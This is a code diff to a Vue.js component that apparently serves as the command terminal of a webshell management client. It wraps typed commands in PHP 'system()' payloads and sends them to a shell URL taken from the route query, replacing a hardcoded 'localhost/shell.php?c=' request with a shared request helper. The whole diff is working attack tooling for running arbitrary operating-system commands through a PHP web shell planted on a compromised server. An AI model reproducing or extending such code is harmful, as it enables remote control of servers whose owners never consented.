@@ -77,7 +77,8 @@
                         color: '#cccccc',
                     },
                 ],
-                currentColor: 'green'
+                currentColor: 'green',
+                shell:{}
             }
         },
         created() {
@@ -111,12 +112,13 @@
                     e.preventDefault()
                 }
             },
+
             async getPwd() {
-                let shell = this.$route.query.shell
+                this.shell = this.$route.query.shell
 
                 let cmd = 'echo %25cd%25'
-                let phpCode = 'header("Content-Type: text/html;charset=GBK");system(\'' + cmd + ' 2>%261\');'
-                let res = await this.$request(this.$geneShellUrl(shell) + phpCode)
+                let phpCode = 'system(\'' + cmd + ' 2>%261\');'
+                let res = await this.$genRequest(this.shell, phpCode,'GBK')
                 res = res.replace('\r\n', '')
                 this.path = res
                 this.type = {
@@ -125,6 +127,7 @@
                     id: '',
                 }
             },
+
             async exec(event, cmd) {
                 console.log(cmd === 'cls')
                 if (cmd === '') return
@@ -135,8 +138,8 @@
                     return
                 }
                 let that = this
-                let phpCode = 'header("Content-Type: text/html;charset=GBK");system(\'' + cmd + ' 2>%261\');'
-                let res = await this.$request('http://localhost/shell.php?c=' + phpCode)
+                let phpCode = 'system(\'' + cmd + ' 2>%261\');'
+                let res = await this.$genRequest(this.shell, phpCode,'GBK')
                 that.row.push({
                     cmd: cmd,
                     historyInput: that.type.input,
